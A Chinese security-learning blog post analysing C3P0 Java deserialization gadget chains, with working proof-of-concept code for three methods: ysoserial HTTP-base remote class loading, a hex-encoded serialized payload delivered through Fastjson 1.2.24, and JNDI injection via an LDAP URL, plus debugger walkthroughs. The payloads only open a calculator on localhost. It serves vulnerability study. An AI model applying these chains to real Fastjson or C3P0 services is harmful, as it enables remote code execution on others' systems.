<!DOCTYPE html>
<html lang="zh-CN">

<head>
        <link rel="canonical" href="https://afghanistanaddress.github.io/html/category/article-1822.htm" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>C3P0反序列化链学习 - Afghanistan Address</title>
        <link rel="icon" href="/assets/addons/xcblog/img/afghanistanaddress/favicon.ico" type="image/x-icon"/>
    <link rel="stylesheet" href="/assets/addons/xcblog/js/frontend/afghanistanaddress/animate/animate.css">
    <link rel="stylesheet" href="/assets/addons/xcblog/css/afghanistanaddress/bootstrap.css">
    <link rel="stylesheet" href="/assets/addons/xcblog/css/afghanistanaddress/maicons.css">
    <link rel="stylesheet" href="/assets/addons/xcblog/js/frontend/afghanistanaddress/owl-carousel/css/owl.carousel.css">
    <link rel="stylesheet" href="/assets/addons/xcblog/css/afghanistanaddress/theme.css">
    <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?07d6804a416dbd216ab0e3d3e283ddad";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body>
    <!-- Back to top button -->
    <div class="back-to-top"></div>
    <header>
                <nav class="navbar navbar-expand-lg navbar-light navbar-float">
            <div class="container">
                                <a href="/" class="navbar-brand">Afghanistan Address</a>
                                <button class="navbar-toggler" data-toggle="collapse" data-target="#navbarContent" aria-controls="navbarContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="navbar-collapse collapse" id="navbarContent">
                    <ul class="navbar-nav ml-lg-4 pt-3 pt-lg-0">
                                                <li class="nav-item">
                            <a href="/" class="nav-link">首页</a>
                        </li>
                                                <li class="nav-item">
                            <a href="/html/category/" class="nav-link">文章分类</a>
                        </li>
                                                <li class="nav-item">
                            <a href="#" class="nav-link">关于</a>
                        </li>
                        <li class="nav-item">
                            <a href="#" class="nav-link">联系</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container mt-5">
            <div class="page-banner">
                <div class="row justify-content-center align-items-center h-100">
                    <div class="col-md-10">
                        <h1 class="text-center">C3P0反序列化链学习</h1>
                        <nav aria-label="Breadcrumb">
                            <ul class="breadcrumb justify-content-center py-0 bg-transparent">
                                <li class="breadcrumb-item"><a href="/">首页</a></li>
                                <li class="breadcrumb-item"><a href="/html/category/">文章分类</a></li>
                                <li class="breadcrumb-item active">正文</li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main>
        <div class="page-section">
            <div class="container">
                <div class="row">
                    <div class="col-md-9">
                          				  				  				<h1 id="c3p0">C3P0</h1> <p>c3p0第一次听闻是用于fastjson的回显上，大佬们总结三种方法，后面两种主要就是用于fastjson和jackjson的回显利用(注入内存马)</p> <pre><code>http base jndi hex序列化字节加载器</code></pre> <h2 id="1http-base">1、http base</h2> <h3 id="11漏洞复现">1.1、漏洞复现</h3> <pre><code class="language-java">package ysoserial.test;  import ysoserial.Serializer; import ysoserial.payloads.C3P0;  import java.io.*;  public class C3P0Test {     public static void main(String[] args) throws Exception {         C3P0 c3P0 = new C3P0();         Object object = c3P0.getObject("http://127.0.0.1:8000/:EXP");         serialize(object,"c3p0.ser");         unserialize("c3p0.ser");       }      public static void serialize(Object obj ,String path) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(path));         objectOutputStream.writeObject(obj);     }     public static void unserialize(String path) throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(path));         objectInputStream.readObject();     } }</code></pre> <p>exp</p> <pre><code class="language-java"> public class EXP {     public EXP() {     }      static {         try {             Runtime var0 = Runtime.getRuntime();             String[] var1 = new String[]{"bash", "-c", "open -a calculator.app"};             Process var2 = var0.exec(var1);             var2.waitFor();         } catch (Exception var3) {         }      } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/c26e9b3b71b2cfb934e179244968bfa0.jpg" alt="C3P0反序列化链学习"></p> <h3 id="12漏洞分析">1.2、漏洞分析</h3> <p>我跟jdk7u21一样还是通过ysoserial来学习，首先先学习一下c3p0链，我们看到getObject()方法，他就是通过<code>:</code>截断，获取url和类名，然后反射创建<code>PoolBackedDataSource</code>类，设置其<code>connectionPoolDataSource</code>属性设置为<code>new PoolSource(className, url)</code>实例。</p> <p>我们继续看看PoolSource,除了构造方法赋值外就是有一个getReference()方法，传入了我们的恶意的url和className</p> <pre><code class="language-java">public class C3P0 implements ObjectPayload&lt;Object&gt; {     public Object getObject ( String command ) throws Exception {         int sep = command.lastIndexOf(':');         if ( sep &lt; 0 ) {             throw new IllegalArgumentException("Command format is: &lt;base_url&gt;:&lt;classname&gt;");         }          String url = command.substring(0, sep);         String className = command.substring(sep + 1);          PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));         return b;     }           private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {          private String className;         private String url;          public PoolSource ( String className, String url ) {             this.className = className;             this.url = url;         }          public Reference getReference () throws NamingException {             return new Reference("exploit", this.className, this.url);         }          public PrintWriter getLogWriter () throws SQLException {return null;}         public void setLogWriter ( PrintWriter out ) throws SQLException {}         public void setLoginTimeout ( int seconds ) throws SQLException {}         public int getLoginTimeout () throws SQLException {return 0;}         public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}         public PooledConnection getPooledConnection () throws SQLException {return null;}         public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}      }       public static void main ( final String[] args ) throws Exception {         PayloadRunner.run(C3P0.class, args);     }  }</code></pre> <h3 id="13poc调试">1.3、POC调试</h3> <h4 id="131序列化分析">1.3.1、序列化分析</h4> <p>我先来看看是怎么序列化的过程，在writeObject处打下断点</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/8d0e9260f766b9a56d003d0796dc465e.jpg" alt="C3P0反序列化链学习"></p> <p>跟进去，进入到<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code>,回去序列化我们的输入this.connectionPoolDataSource，但是由于我们输入的其实就是PoolSource，无法序列化，继续往下走</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/7f3f0542d1493d2334f78b07eac7f254.jpg" alt="C3P0反序列化链学习"></p> <p>走到这，他会序列化<code>indirector.indirectForm(this.connectionPoolDataSource)</code>,我们</p> <pre><code class="language-java">indirector = new ReferenceIndirector(); oos.writeObject(indirector.indirectForm(this.connectionPoolDataSource));</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/54a7486cb5764455fa51729e3dd520d4.jpg" alt="C3P0反序列化链学习"></p> <p>我们跟进去看看，此处调用的getReference()就是PoolSource的getReference方法，也是为什么PoolSource要重写该方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/538cbd286c052d9e7449584fdc8d9c1c.jpg" alt="C3P0反序列化链学习"></p> <p>然后就是ReferenceIndirector.ReferenceSerialized(),我们继续跟进去，可以看到就是把我们构造的特殊的reference赋值给this.reference，所以序列化文件里是包含这我们的恶意reference。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/d80625b4ff1aca5a096c1e1e5effd41f.jpg" alt="C3P0反序列化链学习"></p> <h4 id="132反序列化分析">1.3.2、反序列化分析</h4> <p>我们从报错的也可以看出序列化的接口是在<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code>的readObject</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/27e37451b921ec0047404e1dfc76e5ed.jpg" alt="C3P0反序列化链学习"></p> <p>利用链</p> <pre><code>/*  * Gadget:  *   PoolBackedDataSourceBase#readObject  *     ReferenceIndirector$ReferenceSerialized#getObject  *       ReferenceableUtils#referenceToObject  *         Class#forName  * */</code></pre> <p>我们把断点打在PoolBackedDataSourceBase的readObect(),走到这,会判断o是不是IndirectlySerialized，那么就会触发ReferenceIndirector的getObject方法，跟进去</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/2cc68cd00e8b91071699060da006d388.jpg" alt="C3P0反序列化链学习"></p> <p>进来后会通过ReferenceableUtils.referenceToObject()方法将this.reference(恶意链接)转换成Object，我们继续跟进去</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/308741d3f11e2ff831c98d25c661987b.jpg" alt="C3P0反序列化链学习"></p> <p>获取我们恶意地址字符串和恶意类字符串分别存入var4和var11，并且新建一个ClassLoder里面存我地址，然后通过Class.forName方法加载，此时的var4和var7都是我们可以控制的。然后就会去寻找对应的地址请求恶意类。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/f566d365780501fc42ee65d045e6bb25.jpg" alt="C3P0反序列化链学习"></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/c530bb92f4692e87e533d0417c2a2e98.jpg" alt="C3P0反序列化链学习"></p> <p>我们可以看到在Class.forName触发了我们的代码执行，原因是Class.forName如果没有给定 classloader， 那么会使用根类加载器。如果<code>initalize</code>这个参数传了 true，那么给定的类如果之前没有被初始化过，那么会被初始化，造成远程代码执行</p> <h2 id="2hex序列化字节加载器">2、hex序列化字节加载器</h2> <p>这个可以满足fastjson和c3p0可以做到不出网利用。首先生成序列化payload，这里的payload注意是需要本地的另一条Gadget比如CC或者CB链，然后hex编码一下拼到PoC里</p> <pre><code>java -jar ysoserial.jar CommonsCollections2 "open -a Calculator" &gt; calc.ser</code></pre> <h3 id="21poc复现">2.1、poc复现</h3> <p>依赖</p> <pre><code class="language-xml">        &lt;dependency&gt;             &lt;groupId&gt;com.alibaba&lt;/groupId&gt;             &lt;artifactId&gt;fastjson&lt;/artifactId&gt;             &lt;version&gt;1.2.24&lt;/version&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;com.mchange&lt;/groupId&gt;             &lt;artifactId&gt;c3p0&lt;/artifactId&gt;             &lt;version&gt;0.9.5.2&lt;/version&gt;         &lt;/dependency&gt;         &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;             &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;             &lt;version&gt;4.0&lt;/version&gt;         &lt;/dependency&gt;</code></pre> <p>Poc</p> <pre><code class="language-json">{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:hex编码内容;"}}</code></pre> <pre><code class="language-java">package com.akkacloud;  import com.alibaba.fastjson.JSON; import com.mchange.lang.ByteUtils; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;  import java.io.*; import java.util.Arrays;  public class fast {     public static void main(String[] args) throws IOException, ClassNotFoundException {         InputStream in = new FileInputStream("/Users/akka/Desktop/tools/EXP/Weblogic/calc.ser");         byte[] data = toByteArray(in);         in.close();         String HexString = bytesToHexString(data, data.length);         System.out.println(HexString);         String poc ="{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:"+HexString+";\"}}";         JSON.parseObject(poc);      }      public static byte[] toByteArray(InputStream in) throws IOException {         byte[] classBytes;         classBytes = new byte[in.available()];         in.read(classBytes);         in.close();         return classBytes;     }      public static String bytesToHexString(byte[] bArray, int length) {         StringBuffer sb = new StringBuffer(length);          for(int i = 0; i &lt; length; ++i) {             String sTemp = Integer.toHexString(255 &amp; bArray[i]);             if (sTemp.length() &lt; 2) {                 sb.append(0);             }              sb.append(sTemp.toUpperCase());         }         return sb.toString();     }  }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/3333a31590415af596f8a059edb8f409.jpg" alt="C3P0反序列化链学习"></p> <h3 id="22poc分析">2.2、poc分析</h3> <p>原因仍然是fastjson自动调用属性的setter和getter方法。不懂得可以学习一下前面</p> <p>我们直接在<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>类的 setUpPropertyListeners处打下断点，调用了<code>parseUserOverridesAsString((String)val)</code> ,val就是我们传入的hex加密的字符串，跟进去</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/4d3385986d55e6ee604c94597f095313.jpg" alt="C3P0反序列化链学习"></p> <p>该方法就是把传入的hex加密字符串解密成byte[],然后调用fromByteArray方法，继续跟进去</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/bd29970e1194861d7392220a22ec0d11.jpg" alt="C3P0反序列化链学习"></p> <p>然后调用deserializeFromByteArray方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/d81bed2945dde62e8a75e81dd2f00e37.jpg" alt="C3P0反序列化链学习"></p> <p>到这一步就很清晰了，调用readObejct，造成反序列化恶意代码执行</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/86b4336724b28544878892ee2f4a95a9.jpg" alt="C3P0反序列化链学习"></p> <h2 id="3jndi利用">3、JNDI利用</h2> <p>此方法可以配合tomcatEcho，达到回显</p> <h3 id="31poc复现">3.1、POC复现</h3> <p>依赖</p> <pre><code class="language-xml">&lt;dependency&gt;   &lt;groupId&gt;com.alibaba&lt;/groupId&gt;   &lt;artifactId&gt;fastjson&lt;/artifactId&gt;   &lt;version&gt;1.2.24&lt;/version&gt;   &lt;/dependency&gt;   &lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --&gt; &lt;dependency&gt;   &lt;groupId&gt;com.mchange&lt;/groupId&gt;   &lt;artifactId&gt;c3p0&lt;/artifactId&gt;   &lt;version&gt;0.9.5.2&lt;/version&gt;   &lt;/dependency&gt;</code></pre> <pre><code class="language-java">package com.akkacloud;  import com.alibaba.fastjson.JSON;  public class fast {     public static void main(String[] args) throws Exception {         String poc = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"ldap://127.0.0.1:1389/EXP\", \"loginTimeout\":0}";         JSON.parseObject(poc);     }  }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/188ebd6aeb67e8d3a544c01e5c107335.jpg" alt="C3P0反序列化链学习"></p> <h3 id="32poc分析">3.2、POC分析</h3> <p>这跟fastjson其他利用链的差不多都是由于fastjson会自动触发字段的setter和getter方法。所以会自动触发<code>com.mchange.v2.c3p0.JndiRefForwardingDataSource</code>的<code>setJndiName</code>,但是由于该类没有该方法就会调用其父类<code>com.mchange.v2.c3p0.impl.JndiRefDataSourceBase</code>的<code>setJndiName</code>。我们在该方法打下断点,可以看到该方法就是把this.jndiName赋值为其传入的值(恶意链接)，然后就是调用setloginTimeout</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/95dcda9b445590c52aa85cf901f7714d.jpg" alt="C3P0反序列化链学习"></p> <p>然后进入到<code>om.mchange.v2.c3p0.JndiRefForwardingDataSource</code>累的<code>setloginTimeout</code>，调用<code>inner</code>方法,跟进去</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/1153e98147aa9ed258c3a4645c170c51.jpg" alt="C3P0反序列化链学习"></p> <p>继续调用<code>dereference</code>方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/c6c628c6c161c083f354fc7d4dd41cdf.jpg" alt="C3P0反序列化链学习"></p> <p>跟进去就发现会调用我们<code>ctx.lookup((String)jndiName)</code>,完成jndi注入</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/15badc4ded80ceb1dd88ec7d8de36b1e.jpg" alt="C3P0反序列化链学习"></p> <p>参考<br /><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.cnblogs.com/nice0e3/p/15058285.html"  target="_blank" rel="nofollow">https://www.cnblogs.com/nice0e3/p/15058285.html</a><br /><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.shuzhiduo.com/A/ZOJPN24Odv/"  target="_blank" rel="nofollow">https://www.shuzhiduo.com/A/ZOJPN24Odv/</a></p> 			                        <div class="col-md-12 mt-5">
                                                        <p>上一个：<a href="/html/category/article-1821.htm">SpringCloud系列之分布式请求链路跟踪(Sleuth)</a></p>
                                                        <p>下一个：<a href="/html/category/article-1823.htm">Java8 新特性 &#8211; Instant 时间戳类</a></p>
                                                    </div>
                                            </div>
                    <div class="col-md-3">
                        <div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/html/category/article-1966.htm" title="JavaScript如何将数组与值是数组的对象合并方法详解">JavaScript如何将数组与值是数组的对象合并方法详解</a></li>
                        <li class="py-2"><a href="/html/category/article-1905.htm" title="python中time.strftime不支持中文，报错UnicodeEncodeError: &#8216;locale&#8217; codec can&#8217;t encode character &#8216;\u5e74&#8217; in po&#8230;">python中time.strftime不支持中文，报错UnicodeEncodeError: &#8216;locale&#8217; codec can&#8217;t encode character &#8216;\u5e74&#8217; in po&#8230;</a></li>
                        <li class="py-2"><a href="/html/category/article-1901.htm" title="如何在MySQL中将算术运算符（+，-，*，/）与INTERVAL关键字的单位值一起使用？">如何在MySQL中将算术运算符（+，-，*，/）与INTERVAL关键字的单位值一起使用？</a></li>
                        <li class="py-2"><a href="/html/category/article-1871.htm" title="Git基础Git创建本地版本库详解">Git基础Git创建本地版本库详解</a></li>
                        <li class="py-2"><a href="/html/category/article-1910.htm" title="[转载] Python中format函数用法">[转载] Python中format函数用法</a></li>
                        <li class="py-2"><a href="/html/category/article-1891.htm" title="八大基本数据类型及数据类型之间的转换&#8212;zixiao">八大基本数据类型及数据类型之间的转换&#8212;zixiao</a></li>
                        <li class="py-2"><a href="/html/category/article-2252.htm" title="python向hive插入数据遇到的坑">python向hive插入数据遇到的坑</a></li>
                        <li class="py-2"><a href="/html/category/article-1878.htm" title="echart整体图形大小调整">echart整体图形大小调整</a></li>
                        <li class="py-2"><a href="/html/category/article-1906.htm" title="Java Random随机数">Java Random随机数</a></li>
                        <li class="py-2"><a href="/html/category/article-1924.htm" title="js制作简易秒表效果详细讲解、开始、暂停与结束（定时器制作和时间戳制作）">js制作简易秒表效果详细讲解、开始、暂停与结束（定时器制作和时间戳制作）</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">52</span> <a href="/html/date/2024-06/" title="2024-06 归档">2024-06</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-05/" title="2024-05 归档">2024-05</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">60</span> <a href="/html/date/2024-04/" title="2024-04 归档">2024-04</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-03/" title="2024-03 归档">2024-03</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">50</span> <a href="/html/date/2024-02/" title="2024-02 归档">2024-02</a></h4>
            </li>
                    </ul>
    </div>
</div>



                    </div>
                </div>
            </div> <!-- .container -->
        </div> <!-- .page-section -->
    </main>
        <footer class="page-footer">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 py-2">
                    <p id="copyright">
                        Afghanistan Address 版权所有 Powered by WordPress
                    </p>
                </div>
                <div class="col-sm-6 py-2 text-right">
                    <div class="d-inline-block px-3">
                        <a href="#">Privacy</a>
                    </div>
                    <div class="d-inline-block px-3">
                        <a href="#">Contact Us</a>
                    </div>
                </div>
            </div>
        </div> <!-- .container -->
    </footer> <!-- .page-footer -->
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/jquery-3.5.1.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/bootstrap.bundle.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/wow/wow.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/owl-carousel/js/owl.carousel.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/waypoints/jquery.waypoints.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/animateNumber/jquery.animateNumber.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/google-maps.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/afghanistanaddress/theme.js"></script>
    <script>
    $(function() {
        $('.js_to').click(function(){
            var url = $(this).data('url');
            var code = $(this).data('code');
            url += code;

            window.open(url);
        })
    });
    </script>
</body>

</html>